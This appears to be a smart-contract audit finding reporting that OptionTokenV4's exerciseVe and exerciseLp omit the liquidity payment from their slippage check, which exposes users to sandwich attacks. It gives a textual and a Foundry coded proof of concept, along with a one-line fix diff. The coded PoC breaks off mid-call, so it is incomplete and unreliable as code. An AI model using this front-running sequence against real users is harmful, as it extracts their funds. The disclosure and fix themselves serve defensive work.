# exerciseVe and exerciseLp are vulnerable to MEV

## Summary
when optionToken holders want to use their discount and stake their lps token directly they can use `OptionTokenV4::exerciseVe` and `OptionTokenV4::exerciseLp`, paymentAmountToAddLiquidity will be computed in execution duration and that depend on reserves in that moment,leading to pay more than expected amount and sandwich attack
## Vulnerability Detail
**Textual PoC:**
Let's assume Alice has 1000 oFlow and she wants to exercise them to lps token and stake them, Alice gets 1000 FLOW as a underlying token and if reserve0 and reserve1 be 500 Alice has to pay 1000 DAI for paymentToken,attacker see this transaction in mempool and swap FLOW to DAI leading to increase DAI reserve and this mean Alice has to pay DAI more than expected amount and attacker can get porfit


**Coded PoC:**
```solidity
    function testSandwichAttack() external {
        address attacker = makeAddr("attacker");
        vm.startPrank(address(owner));
        FLOW.approve(address(oFlowV4), 1000e18);
        oFlowV4.mint(address(owner2), 1000e18);

        washTrades();
        vm.stopPrank();
        

        assertEq(oFlowV4.balanceOf(address(owner2)), 1000e18);

        (uint256 underlyingReserve, uint256 paymentReserve) = IRouter(router).getReserves(address(FLOW), address(DAI), false);
        uint256 paymentAmountToAddLiquidity = (TOKEN_1 * paymentReserve) /  underlyingReserve;
        DAI.mint(attacker, paymentReserve);

        Router.route[] memory routes = new Router.route[](1);
        routes[0] = Router.route(address(DAI), address(FLOW), false);

        uint256[] memory expectedOutput = router.getAmountsOut(
                paymentReserve,
                routes
            );
        uint before_swap_dai_balance = DAI.balanceOf(attacker);

        vm.startPrank(attacker);
        DAI.approve(address(router), paymentReserve);    
        router.swapExactTokensForTokens(
            paymentReserve,
            expectedOutput[1],
            routes,
            attacker,
            block.timestamp

        );
        vm.stopPrank();
        uint after_swap_flow_balance = FLOW.balanceOf(attacker);

        (underlyingReserve, paymentReserve) = IRouter(router).getReserves(address(FLOW), address(DAI), false);


        vm.startPrank(address(owner2));
        DAI.approve(address(oFlowV4), type(uint).max);

        assertGt(DAI.balanceOf(address(owner2)), 4187724401248807160512);
        (, uint256 nftId, ) = oFlowV4.exerciseVe(
            1000e18,
            1000e18 + paymentAmountToAddLiquidity,
            address(owner2),
            20,
            block.timestamp
        );
        vm.stopPrank();
         (underlyingReserve, paymentReserve) = IRouter(router).getReserves(address(FLOW), address(DAI), false);

        
        Router.route[] memory reRoutes = new Router.route[](1);
        reRoutes[0] = Router.route(address(FLOW), address(DAI), false);
        uint256[] memory expectedOutput2 = router.getAmountsOut(
                after_swap_flow_balance,
                reRoutes
        );
        vm.startPrank(attacker);

            attacker,

## Tool used

Manual Review

## Recommendation
option token holders should be able control max payment amount
```diff
    function _exerciseVe(
        uint256 _amount,
        uint256 _maxPaymentAmount,
        uint256 _discount,
        address _recipient
...
        (uint256 paymentAmount,uint256 paymentAmountToAddLiquidity) =  getPaymentTokenAmountForExerciseLp(_amount,_discount); // TODO decide if we want to have the curve or just always maxlock
-        if (paymentAmount > _maxPaymentAmount)
+        if (paymentAmount + paymentAmountToAddLiquidity > _maxPaymentAmount)
            revert OptionToken_SlippageTooHigh();
```
